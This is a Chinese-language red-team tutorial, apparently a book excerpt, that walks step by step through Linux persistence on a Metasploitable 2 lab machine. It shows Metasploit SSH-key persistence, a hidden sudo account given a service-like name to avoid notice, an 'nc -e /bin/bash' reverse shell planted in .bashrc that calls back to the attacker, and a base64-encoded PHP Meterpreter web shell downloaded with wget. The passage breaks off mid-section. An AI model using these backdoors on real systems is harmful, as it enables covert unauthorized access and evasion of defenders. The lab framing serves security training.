---
title: 服务器总被重启、控制一到手就断？红队的 5 种持久化控制技术（2026）
url: https://mp.weixin.qq.com/s/e_yDy3vAJEwx4M_Ufq9a6Q
source: Doonsec's feed
date: 2026-11-24
fetch_date: 2026-11-25T10:41:10.622990
---

# 服务器总被重启、控制一到手就断？红队的 5 种持久化控制技术（2026）

# 服务器总被重启、控制一到手就断？红队的 5 种持久化控制技术（2026）

原创

徐哥
徐哥

Ms08067安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

本文选自《基于Kali Linux2的红蓝对抗指南》![](https://mmbiz.qpic.cn/sz_mmbiz_png/GVAVvm742xOIVRVaPhkuOuclxANofe2110WSicb9trtxv3ibxaOGNHSTuiakyOOjBmW8mcraxYlg8ag3gZQ3iahqeDxRxmAxE3UVRWQWv3AqFW0/640?wx_fmt=png&from=appmsg)

本章介绍五种技术：利用 SSH 实现持久化控制、通过创建系统用户实现持久化控制、利用 Netcat 反向连接实现持久化控制、利用 PHP 建立持久化控制、利用 cron 建立持久化控制。

01

PART

用 SSH 密钥，改了密码也能登录

SSH KEY PERSISTENCE

红队第一个方案很直接：盗取或破解目标服务器的 SSH 账号和密码，从而可在任意时间登录。但问题很快来了——按蓝队密码规章，每隔 3 个月要改一次密码，真实场景模拟里周期可能更短。**靠密码，不稳。**

红队很快完善方案：为指定用户（比如 msfadmin）添加密钥登录。这样即使蓝队改了密码，红队照样能用密钥登进去。

STEP破解 SSH 登录并获取会话

先用 msfconsole 启动 Metasploit，搜索 ssh\_login 模块：

...bash

┌──(kali㉿kali)-[~]

└─$ msfconsole

msf6 > search ssh\_login

![图13-1](https://mmbiz.qpic.cn/sz_mmbiz_png/GVAVvm742xMABj6MhsblvDMPcCmD0yeQmjEJD6cp4wibsiaYJbicUjssd47ibIxeNQt2jRib9iaqPiaRV3l6FUia6PSW0HOcVUyfnsTxuefav9yGcMw/640?wx_fmt=png&from=appmsg)

图13-1　搜索 ssh\_login 模块

设置 rhosts、username、password 三个参数，用 run 发起攻击，就能拿到一个控制目标的会话。

![图13-2](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xMjds8iaf2j38fYYBRH0oorFnnWEt2v55XAiaic9LusME6FNWB5LsUnhLyjs8LjnTFMiaN5Ca1DzouSxw68kX0cmUOG833b9GXia8ibk/640?wx_fmt=png&from=appmsg)

![图13-3](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xObMW3555wozH7bMYacuK7IgVmRXbBpuFxbEFFN4gibD5NRXOib2KqUu2nJzWgYEGbyanNpt2uBtia02U5V9enxN2Ps9nicN1e7Glo/640?wx_fmt=png&from=appmsg)

图13-2 / 图13-3　设置参数并执行攻击

STEP建立远程登录密钥

用 Ctrl+Z 把会话放到后台，搜索 sshkey\_persistence 模块——它专门用来建立远程登录密钥。这个模块最重要的参数是 **SESSION**，要设为刚建立的连接：用 sessions -l 查看，本例是「1」。

![图13-4](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xPkawhCBleiaaFQGjJNno8loaTWJibCz1Qp89lVd0t4MaeicJcCsAVpM04YibtJVIeFHKQQjaKla3t1ZpbAqGNdV3ZDCJSCdhfabU8/640?wx_fmt=png&from=appmsg)

![图13-5](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xPUkMCWsXtiawgiaPKiceApZxLRpnrIAoJ5naKVuVq1guWy4icJBMbMDuGOgHxWrM6yyLNNpvVq3It84kl65XyWNjc7Rck4WYRH56A/640?wx_fmt=png&from=appmsg)

![图13-6](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xO8sjIXqicFw6swdAMicia4fDXHk6uLvswjciboPrShkwticglx7l39W5HmUdXD6DdicRz2PjmLGibicaV5BhDHSCSdKPTcJMIdPOiaYCdU/640?wx_fmt=png&from=appmsg)

![图13-7](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xPz6R8CnMJNHCeVnPI8icDZtGfvR5XECkNK6Gc7vXFS2n3l1ibhiaamj3HJQJce3kqhe2sWE2fApt6zUjyO6iblq4b44sGCAia6W4oc/640?wx_fmt=png&from=appmsg)

图13-4 ~ 图13-7　查找模块、查看参数与连接、运行模块

注意：这个模块的结果**不是直接控制目标，而是产生一个远程控制的私钥**。私钥位置见图13-7，接下来把它的权限设为 600。

...bash

# 密钥名字很长且每次都不同，需按图13-7的实际结果替换

chmod 600 /home/kali/.msf4/loot/20250128040235\_default\_192.168.139.167\_id\_rsa\_670620.txt

为什么必须是 600？

**文件所有者可读写，所属组和其他用户都没有任何权限。** 私钥包含身份验证的密钥信息，非常敏感，SSH 要求其权限必须严格限制——否则一旦被别人读到，就是安全风险。另外，这个密钥名字很长、每次都不同，要按图13-7的实际结果替换。

![图13-8](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xNUM6ia9CKWS3n0WXkwibLTQy7qy7qTPjcfoIlForvnEk5uib8Qd9QzGXt2OWrBqGhYqbSq9xCXV7SemPym65Cs00e45SEEpiar6Rw/640?wx_fmt=png&from=appmsg)

图13-8　为密钥文件添加 600 权限

现在红队不用密码，用密钥就能远程登录：

...bash

ssh msfadmin@192.168.139.167 -o HostKeyAlgorithms=+ssh-dss \

  -i /home/kali/.msf4/loot/20250128040235\_default\_192.168.139.167\_id\_rsa\_670620.txt

![图13-9](https://mmbiz.qpic.cn/sz_mmbiz_png/GVAVvm742xNQUzzn34B8qgtanOck5vhb30puiaynibsytO3VebgrJOjRq7JncYSDJHibOzZutVSKSzl29gpUuNvJ3OrxEKb1TpJuqufB0xoZ0k/640?wx_fmt=png&from=appmsg)

图13-9　使用密钥文件远程登录

02

PART

悄悄建一个系统用户

CREATE SYSTEM USER

除了偷偷加密钥，红队还偷偷建了一个新账号以备不时之需。和 Windows 不同，Linux 系统用户数目众多，蓝队如果不专门检查，很难发现多了一个人。

先用 msfadmin / msfadmin 登录 Metasploitable 2，再提权到 root：

...bash

┌──(kali㉿kali)-[~]

└─$ ssh msfadmin@192.168.139.167 -o HostKeyAlgorithms=+ssh-dss

msfadmin@192.168.139.167's password:

msfadmin@metasploitable:~$ sudo -i

[sudo] password for msfadmin:

root@metasploitable:~#

创建用户 smtp，加入 sudo 组，设置密码：

...bash

root@metasploitable:~# useradd -m -s /bin/bash smtp

root@metasploitable:~# usermod -aG sudo smtp

root@metasploitable:~# passwd smtp

Enter new UNIX password:

Retype new UNIX password:

passwd: password updated successfully

root@metasploitable:~# cat /etc/passwd

在 /etc/passwd 里就能看到多了个 smtp 用户。重启 Metasploitable 2，用 smtp 账号 SSH 登录，能进去就说明账号建成了。

![图13-10](https://mmbiz.qpic.cn/sz_mmbiz_png/GVAVvm742xOsydbk4yxtsFibe4Cqv7J20RNG9dZQkxLEN5BibNENEPxksUFErUd1HJaTrXRqFkGYWMlhS1gSvVorOuC6wODcalXQvWXg3DOW8/640?wx_fmt=png&from=appmsg)

![图13-11](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xMhtFEToNTXvvZQuHpKU4nlDNfxy8mNEDcEcLr0xLl7ibILonUUKCh0hrfNwzHgs4RqXA0O0iavZkqS1BFgh0e5qke2Oj9N4DPWY/640?wx_fmt=png&from=appmsg)

图13-10 / 图13-11　新增 smtp 用户、用新账号远程登录

隐蔽性要点

**起一个更隐秘的用户名，比用真实姓名更难被发现。** 比如 `ftp` 就比 `Jack` 更像一个服务账户。另外，在 Linux 上建用户需要 root 权限。

03

PART

改一个 .bashrc，登录即连回

NETCAT REVERSE SHELL

.bashrc 是 Linux 用户主目录下的重要配置文件，用来定义 Bash 的交互式环境。关键点：每当打开新终端或启动新的 Bash 会话，里面的命令都会自动执行。红队据此想出一招：在 .bashrc 里塞一条 bash 反向连接命令，让它连回自己的 netcat 监听器。

用 vim 打开（nano 更简单），按 i 进入插入模式，加入一行：

...bash

root@metasploitable:~# vim ~/.bashrc

# 在文件中插入一行：

nc -e /bin/bash <KALI-IP> <PORT> 2>/dev/null &

![图13-12](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xPYL33hoIhx1zHPVD9sn4oZBHIRRrTD2hP5K3T8wEmSuDFFcJIuA6bPXibn4e3icFt9MKExJOGGiaTsOZdic0JNlMr8PgmPRDUaqzM/640?wx_fmt=png&from=appmsg)

图13-12　修改后的 .bashrc 文件

保存：按 Esc，输入 :wq。切到 Kali Linux 2，启动主控端：

...bash

└─$ nc -nvlp 6666

-nvlp 是 Netcat 的组合参数：

* -n：直接用 IP 地址，不做域名解析。
* -v：显示详细信息（连接状态、数据传输）。
* -l：启动监听模式，等待传入连接。
* -p：指定本地监听端口。

![图13-13](https://mmbiz.qpic.cn/sz_mmbiz_png/GVAVvm742xOBew8g9bGfgAYof3TktDkKTzJRPRPVWZNyhvSFiaiaiatu1hGfsEbd7jt2IDhnRWQAxp6Rv1vhiaWHwoKtria4oJG62zNsa8icZiac8s/640?wx_fmt=png&from=appmsg)

图13-13　将 nc 作为主控端启动

重启 Metasploitable 2、用 msfadmin 登录后，切回 Kali 就能看到连接建立了，还能执行 who 之类的命令。

![图13-14](https://mmbiz.qpic.cn/sz_mmbiz_png/GVAVvm742xNl6nVjYFSM4JcfzAs7D6cxoG2POWNonsQFeHEeF5CkvibfsP7KISslvLqL9ff7b31UCcEibgibvEsUiaN0sUdbawMdiajUM8Hf778E/640?wx_fmt=png&from=appmsg)

![图13-15](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xO5jIjCPhmEiaiaiaEB5ptbRLq8wiakZPUOeibM8BlBhe6UKyzQjN2RnlKzbnVFrMNhneyn24x1AtWClsGMcmI3U1ndczaMTdLqbqB8/640?wx_fmt=png&from=appmsg)

图13-14 / 图13-15　连接建立、在 nc 主控端执行 who

04

PART

传一个 PHP 后门，访问即上线

PHP WEB SHELL

服务器对外最常见的服务就是 Web。PHP 是开源的服务器端脚本语言，同样能写远程控制程序。因为服务器支持 PHP，红队就多了一条路——而且用 PHP 写的远控更隐蔽，更不容易被发现。

先用 Nmap 的 http-php-version 脚本验证目标是否支持 PHP。结果：80 端口支持 PHP（版本可能是 5.1.3–5.1.6 或 5.2.0–5.2.17 之一），443 端口不支持。

![图13-16](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xNr5JvG91vnPCWxDibFrHCtpK16ukNhZFUwXIqVqmtsKgcY1GAFuwVr1apJRN32yqibicQJgFBAtlVo3z7xyndBLxpGThv349YaK4/640?wx_fmt=png&from=appmsg)

图13-16　检查目标是否支持 PHP

红队的方案三步走：

* 编写一个 PHP 远程控制程序。
* 上传到目标网站目录，让它成为网页。
* 浏览器访问这个页面时，服务器解析执行，远控程序运行。

目标跑的是 LAMP（Linux + Apache + MySQL + PHP）。红队不自己写，而是用 Metasploit 生成 PHP 版 Meterpreter 当后门：

...bash

msfvenom -p php/meterpreter/reverse\_tcp LHOST=<KALI-IP> LPORT=<PORT> \

  -e php/base64 -f raw > backup.php

参数含义：

参数

含义

-p php/meterpreter/reverse\_tcp

PHP 版反向 TCP Meterpreter Shell

LHOST

攻击者 IP（Kali），用于反向连接

LPORT

监听端口，如 4444

-e php/base64

Base64 编码，绕过简单检测

-f raw

输出原始 PHP 代码

> backup.php

保存为 backup.php 文件

![图13-17](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xMkDuljvUiboN5ob2N9K5MmJib54Q3sLibGQntufQDynTMuHeoateStOq3S99JwxYKLglBd5at38Dq5tuGEk66tBKuU242KqhecUw/640?wx_fmt=png&from=appmsg)

![图13-18](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xMSUwqicWvApwRsh0TiaAxvk8EUuEYicSmGGLvt2GDTBia6MxSYic2Q7u4JAnAianKLnCB4Em0SECDY0RYpR7kzjwGt54LVNAnfRpOlk/640?wx_fmt=png&from=appmsg)

图13-17 / 图13-18　生成 PHP Meterpreter、查看代码

接着在 backup.php 所在目录开一个 Web 服务器，再新开终端启动 Metasploit，生成与它对应的 handler（**别关这个终端**）。

![图13-19](https://mmbiz.qpic.cn/sz_mmbiz_png/GVAVvm742xNegXo4hRl4Y0ANjiaRBWjPo5EGPEv3EHOKEicPSUas8UVXm2d231rxe7qEfzbibGibn2JfRa9DAibSdlYlOck70UamX0czAcibtBuicE/640?wx_fmt=png&from=appmsg)

![图13-20](https://mmbiz.qpic.cn/mmbiz_png/GVAVvm742xMK6t4OowUCMBlx9093w4CgmI5ibgoGGnaHhdtTZo5hCVmqtRF4otCR3TOsSoCs9NGAHNPRznvfVicViap5987VAXIyfuAzDUPh7M/640?wx_fmt=png&from=appmsg)

图13-19 / 图13-20　开启 Web 服务、启动 handler

渗透进 Metasploitable 2（本节用 msfadmin SSH 登录代替），切到网站目录 /var/www，用 wget 下载 backup.php，改权限：

...bash

root@metasploitable:/var/www# chmod 777 backup.php

最后在 Kali 的浏览器里访问 backup.php。服务器一解析执行，切回 handler 终端就能看到新连接——控制成功。

![图13-21](https://mmb...